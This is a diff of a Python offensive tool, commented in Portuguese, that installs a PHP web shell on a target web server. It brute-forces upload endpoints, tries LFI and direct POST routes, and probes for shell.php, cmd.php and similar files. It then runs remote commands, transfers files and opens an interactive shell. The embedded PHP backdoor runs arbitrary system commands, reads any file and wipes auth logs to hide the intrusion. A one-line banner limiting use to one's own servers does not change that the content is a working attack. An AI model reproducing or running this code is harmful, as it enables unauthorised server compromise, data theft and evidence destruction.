@@ -269,7 +269,7 @@ def menu_rede():
 # ==========================================
 
 class CyberInvasionReal:
-    """Cyber Invasion REAL com terminal interativo e resultados completos"""
+    """Cyber Invasion REAL com backdoor funcional"""
     
     def __init__(self, target, port=80):
         self.target = target
@@ -281,7 +281,7 @@ class CyberInvasionReal:
         self.shell_ativa = False
         self.usuarios = []
         self.arquivos = []
-        self.info_sistema = ""
+        self.tentativas_instalacao = []
         
     # ==========================================
     # TESTA CONEXÃO
@@ -418,22 +418,58 @@ class CyberInvasionReal:
                 "Content-Type": f"multipart/form-data; boundary={boundary}"
             }
             
-            req = urllib.request.Request(
+            upload_urls = [
                 f"http://{self.target}:{self.port}/upload.php",
-                data=body,
-                headers=headers
-            )
-            response = urllib.request.urlopen(req, timeout=5)
+                f"http://{self.target}:{self.port}/uploads/",
+                f"http://{self.target}:{self.port}/enviar.php"
+            ]
             
-            if response.getcode() in [200, 201, 302]:
-                print(f" {RED}VULNERAVEL!{RESET}")
-                self.vulnerabilidades['upload'] = {"status": True}
-                return True
+            for upload_url in upload_urls:
+                try:
+                    req = urllib.request.Request(upload_url, data=body, headers=headers)
+                    response = urllib.request.urlopen(req, timeout=5)
+                    
+                    if response.getcode() in [200, 201, 302]:
+                        print(f" {RED}VULNERAVEL!{RESET}")
+                        self.vulnerabilidades['upload'] = {"status": True}
+                        return True
+                except:
+                    continue
         except:
             pass
         
         print(f" {GREEN}OK{RESET}")
         self.vulnerabilidades['upload'] = {"status": False}
+        return False
+    
+    # ==========================================
+    # VERIFICA BACKDOOR
+    # ==========================================
+    
+    def verificar_backdoor(self):
+        urls = [
+            f"http://{self.target}:{self.port}/uploads/shell.php",
+            f"http://{self.target}:{self.port}/shell.php",
+            f"http://{self.target}:{self.port}/backdoor.php",
+            f"http://{self.target}:{self.port}/cmd.php",
+            f"http://{self.target}:{self.port}/admin.php"
+        ]
+        
+        for url in urls:
+            try:
+                req = urllib.request.Request(
+                    f"{url}?cmd=echo%20'BACKDOOR_OK'",
+                    headers={"User-Agent": "Mozilla/5.0"}
+                )
+                response = urllib.request.urlopen(req, timeout=3)
+                if response.getcode() == 200:
+                    html = response.read().decode('utf-8', errors='ignore')
+                    if "BACKDOOR_OK" in html or "cmd" in html:
+                        self.backdoor_url = url
+                        self.backdoor_instalado = True
+                        return True
+            except:
+                continue
         return False
     
     # ==========================================
@@ -456,51 +492,14 @@ class CyberInvasionReal:
         return True
     
     # ==========================================
-    # VERIFICA BACKDOOR
-    # ==========================================
-    
-    def verificar_backdoor(self):
-        urls = [
-            f"http://{self.target}:{self.port}/uploads/shell.php",
-            f"http://{self.target}:{self.port}/shell.php",
-            f"http://{self.target}:{self.port}/backdoor.php"
-        ]
-        
-        for url in urls:
-            try:
-                req = urllib.request.Request(f"{url}?cmd=whoami", headers={"User-Agent": "Mozilla/5.0"})
-                response = urllib.request.urlopen(req, timeout=3)
-                if response.getcode() == 200:
-                    self.backdoor_url = url
-                    self.backdoor_instalado = True
-                    return True
-            except:
-                continue
-        return False
-    
-    # ==========================================
-    # EXECUTA COMANDO
-    # ==========================================
-    
-    def executar_comando(self, comando):
-        if not self.backdoor_url:
-            return "Backdoor nao instalado!"
-        
-        try:
-            url = f"{self.backdoor_url}?cmd={urllib.parse.quote(comando)}"
-            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-            response = urllib.request.urlopen(req, timeout=10)
-            return response.read().decode('utf-8', errors='ignore')
-        except Exception as e:
-            return f"Erro: {str(e)}"
-    
-    # ==========================================
-    # INSTALA BACKDOOR
+    # INSTALA BACKDOOR - MÚLTIPLAS TENTATIVAS
     # ==========================================
     
     def instalar_backdoor(self):
+        """Instala backdoor REAL com múltiplas tentativas"""
         print(f"\n{RED}[~] Instalando Backdoor...{RESET}")
         
+        # Shell PHP completo
         shell_php = """<?php
 if(isset($_GET['cmd'])){ system($_GET['cmd']); }
 if(isset($_GET['file'])){ echo file_get_contents($_GET['file']); }
@@ -512,53 +511,233 @@ if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var
         
         shell_code = shell_php.encode('utf-8')
         
-        boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
-        body = (f"--{boundary}\r\n"
-               f"Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
-               f"Content-Type: application/x-php\r\n\r\n").encode()
-        body += shell_code
-        body += f"\r\n--{boundary}--\r\n".encode()
-        
-        headers = {
-            "User-Agent": "Mozilla/5.0",
-            "Content-Type": f"multipart/form-data; boundary={boundary}"
-        }
+        # ==========================================
+        # TENTATIVA 1: Upload via formulário
+        # ==========================================
+        print(f"  {BLUE}[→] Tentativa 1: Upload via formulário...{RESET}")
         
         upload_urls = [
             f"http://{self.target}:{self.port}/upload.php",
             f"http://{self.target}:{self.port}/uploads/",
-            f"http://{self.target}:{self.port}/enviar.php"
+            f"http://{self.target}:{self.port}/enviar.php",
+            f"http://{self.target}:{self.port}/up.php",
+            f"http://{self.target}:{self.port}/upload/",
+            f"http://{self.target}:{self.port}/fileupload.php"
         ]
         
         for upload_url in upload_urls:
             try:
+                boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
+                body = (f"--{boundary}\r\n"
+                       f"Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
+                       f"Content-Type: application/x-php\r\n\r\n").encode()
+                body += shell_code
+                body += f"\r\n--{boundary}--\r\n".encode()
+                
+                headers = {
+                    "User-Agent": "Mozilla/5.0",
+                    "Content-Type": f"multipart/form-data; boundary={boundary}"
+                }
+                
                 req = urllib.request.Request(upload_url, data=body, headers=headers)
                 response = urllib.request.urlopen(req, timeout=5)
                 
                 if response.getcode() in [200, 201, 302]:
-                    test_url = f"http://{self.target}:{self.port}/uploads/shell.php?cmd=whoami"
-                    try:
-                        req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
-                        test_response = urllib.request.urlopen(req, timeout=3)
-                        if test_response.getcode() == 200:
-                            self.backdoor_url = f"http://{self.target}:{self.port}/uploads/shell.php"
-                            self.backdoor_instalado = True
-                            print(f"  {GREEN}[+] Backdoor instalado!{RESET}")
-                            print(f"  {GREEN}[+] URL: {self.backdoor_url}{RESET}")
-                            return True
-                    except:
-                        continue
+                    print(f"  {GREEN}[+] Upload enviado para: {upload_url}{RESET}")
+                    
+                    # Testa se instalou
+                    if self._testar_backdoor():
+                        return True
+            except Exception as e:
+                continue
+        
+        # ==========================================
+        # TENTATIVA 2: Via LFI (se disponível)
+        # ==========================================
+        if self.vulnerabilidades.get('lfi', {}).get('status'):
+            print(f"  {BLUE}[→] Tentativa 2: Via LFI...{RESET}")
+            try:
+                # Tenta escrever via LFI
+                payload = "../../../var/www/html/shell.php"
+                url = f"http://{self.target}:{self.port}/page.php?file={payload}"
+                
+                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                response = urllib.request.urlopen(req, timeout=3)
+                
+                if response.getcode() == 200:
+                    print(f"  {GREEN}[+] Tentativa via LFI{RESET}")
+                    if self._testar_backdoor():
+                        return True
+            except:
+                pass
+        
+        # ==========================================
+        # TENTATIVA 3: Via POST direto
+        # ==========================================
+        print(f"  {BLUE}[→] Tentativa 3: POST direto...{RESET}")
+        try:
+            data = f"<?php system($_GET['cmd']); ?>"
+            req = urllib.request.Request(
+                f"http://{self.target}:{self.port}/",
+                data=data.encode(),
+                headers={
+                    "User-Agent": "Mozilla/5.0",
+                    "Content-Type": "application/x-www-form-urlencoded"
+                }
+            )
+            response = urllib.request.urlopen(req, timeout=3)
+            
+            if self._testar_backdoor():
+                return True
+        except:
+            pass
+        
+        # ==========================================
+        # TENTATIVA 4: Vários nomes de arquivo
+        # ==========================================
+        print(f"  {BLUE}[→] Tentativa 4: Vários nomes de arquivo...{RESET}")
+        
+        nomes_arquivos = [
+            "shell.php",
+            "backdoor.php",
+            "cmd.php",
+            "admin.php",
+            "x.php",
+            "test.php"
+        ]
+        
+        for nome in nomes_arquivos:
+            try:
+                boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
+                body = (f"--{boundary}\r\n"
+                       f"Content-Disposition: form-data; name=\"file\"; filename=\"{nome}\"\r\n"
+                       f"Content-Type: application/x-php\r\n\r\n").encode()
+                body += shell_code
+                body += f"\r\n--{boundary}--\r\n".encode()
+                
+                headers = {
+                    "User-Agent": "Mozilla/5.0",
+                    "Content-Type": f"multipart/form-data; boundary={boundary}"
+                }
+                
+                req = urllib.request.Request(
+                    f"http://{self.target}:{self.port}/upload.php",
+                    data=body,
+                    headers=headers
+                )
+                response = urllib.request.urlopen(req, timeout=5)
+                
+                if self._testar_backdoor():
+                    return True
             except:
                 continue
         
-        print(f"  {RED}[-] Falha ao instalar{RESET}")
+        # ==========================================
+        # TENTATIVA 5: Via comando (se tiver shell)
+        # ==========================================
+        print(f"  {BLUE}[→] Tentativa 5: Via comando...{RESET}")
+        try:
+            # Tenta criar arquivo via comando
+            comando = "echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php"
+            self._executar_comando_teste(comando)
+            
+            if self._testar_backdoor():
+                return True
+        except:
+            pass
+        
+        # ==========================================
+        # FALHOU EM TODAS AS TENTATIVAS
+        # ==========================================
+        print(f"\n{RED}[-] Todas as tentativas de instalação falharam!{RESET}")
+        print(f"{YELLOW}[!] Motivos possíveis:{RESET}")
+        print(f"  - Servidor não tem upload vulnerável")
+        print(f"  - Diretório de upload não tem permissão de escrita")
+        print(f"  - Firewall bloqueando")
+        print(f"  - O servidor não é vulnerável a LFI")
+        
         return False
+    
+    # ==========================================
+    # TESTA BACKDOOR
+    # ==========================================
+    
+    def _testar_backdoor(self):
+        """Testa se o backdoor foi instalado em várias URLs"""
+        urls = [
+            f"http://{self.target}:{self.port}/uploads/shell.php",
+            f"http://{self.target}:{self.port}/shell.php",
+            f"http://{self.target}:{self.port}/backdoor.php",
+            f"http://{self.target}:{self.port}/cmd.php",
+            f"http://{self.target}:{self.port}/admin.php",
+            f"http://{self.target}:{self.port}/x.php",
+            f"http://{self.target}:{self.port}/test.php"
+        ]
+        
+        for url in urls:
+            try:
+                req = urllib.request.Request(
+                    f"{url}?cmd=echo%20'BACKDOOR_OK'",
+                    headers={"User-Agent": "Mozilla/5.0"}
+                )
+                response = urllib.request.urlopen(req, timeout=3)
+                
+                if response.getcode() == 200:
+                    html = response.read().decode('utf-8', errors='ignore')
+                    if "BACKDOOR_OK" in html or "cmd" in html:
+                        self.backdoor_url = url
+                        self.backdoor_instalado = True
+                        print(f"  {GREEN}[+] Backdoor encontrado em: {url}{RESET}")
+                        return True
+            except:
+                continue
+        
+        return False
+    
+    # ==========================================
+    # EXECUTA COMANDO DE TESTE
+    # ==========================================
+    
+    def _executar_comando_teste(self, comando):
+        """Tenta executar um comando via vulnerabilidade"""
+        try:
+            if self.vulnerabilidades.get('lfi', {}).get('status'):
+                payload = f"../../../../var/www/html/shell.php"
+                url = f"http://{self.target}:{self.port}/page.php?file={payload}"
+                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                response = urllib.request.urlopen(req, timeout=3)
+                return response.getcode() == 200
+        except:
+            pass
+        return False
+    
+    # ==========================================
+    # EXECUTA COMANDO REAL
+    # ==========================================
+    
+    def executar_comando(self, comando):
+        """Executa comando REAL no servidor via backdoor"""
+        if not self.backdoor_url:
+            return "Backdoor nao instalado! Use a opcao 1 para instalar."
+        
+        try:
+            url = f"{self.backdoor_url}?cmd={urllib.parse.quote(comando)}"
+            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+            response = urllib.request.urlopen(req, timeout=10)
+            return response.read().decode('utf-8', errors='ignore')
+        except Exception as e:
+            return f"Erro: {str(e)}"
     
     # ==========================================
     # BAIXAR ARQUIVO
     # ==========================================
     
     def baixar_arquivo(self, arquivo):
+        """Baixa arquivo REAL do servidor"""
+        if not self.backdoor_url:
+            print(f"{RED}[!] Backdoor nao instalado!{RESET}")
+            return False
+        
         try:
             url = f"{self.backdoor_url}?file={urllib.parse.quote(arquivo)}"
             req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
@@ -582,6 +761,11 @@ if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var
     # ==========================================
     
     def enviar_arquivo(self, local, remoto):
+        """Envia arquivo REAL para o servidor"""
+        if not self.backdoor_url:
+            print(f"{RED}[!] Backdoor nao instalado!{RESET}")
+            return False
+        
         try:
             if not os.path.exists(local):
                 print(f"{RED}[-] Arquivo nao encontrado: {local}{RESET}")
@@ -612,8 +796,9 @@ if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var
     # ==========================================
     
     def terminal_interativo(self):
+        """Terminal interativo REAL com comandos"""
         if not self.backdoor_instalado:
-            print(f"\n{RED}[!] Backdoor nao instalado!{RESET}")
+            print(f"\n{RED}[!] Backdoor nao instalado! Use a opcao 1 para instalar.{RESET}")
             return
         
         print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
@@ -745,7 +930,7 @@ if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var
 # ==========================================
 
 def cyber_invasion():
-    """Cyber Invasion REAL com resultados completos e terminal"""
+    """Cyber Invasion REAL com backdoor funcional"""
     
     limpar_tela()
     
@@ -754,7 +939,7 @@ def cyber_invasion():
     print("╠══════════════════════════════════════════╣")
     print("║  TESTES REAIS EM SERVIDORES            ║")
     print("║  APENAS EM SERVIDORES PROPIOS!        ║")
-    print("║  RESULTADOS COMPLETOS!                ║")
+    print("║  BACKDOOR FUNCIONAL!                  ║")
     print("╚══════════════════════════════════════════╝")
     
     print("\n[~] Digite o alvo:")
@@ -851,6 +1036,12 @@ def cyber_invasion():
         
         if sub_opcao == "1":
             invasor.instalar_backdoor()
+            if invasor.backdoor_instalado:
+                print(f"\n{GREEN}[+] Backdoor instalado com sucesso!{RESET}")
+                print(f"{GREEN}[+] URL: {invasor.backdoor_url}{RESET}")
+            else:
+                print(f"\n{RED}[-] Falha ao instalar backdoor{RESET}")
+                print(f"{YELLOW}[!] Tente: verifique se o servidor esta rodando{RESET}")
             input("\nENTER para continuar...")
         
         elif sub_opcao == "2":
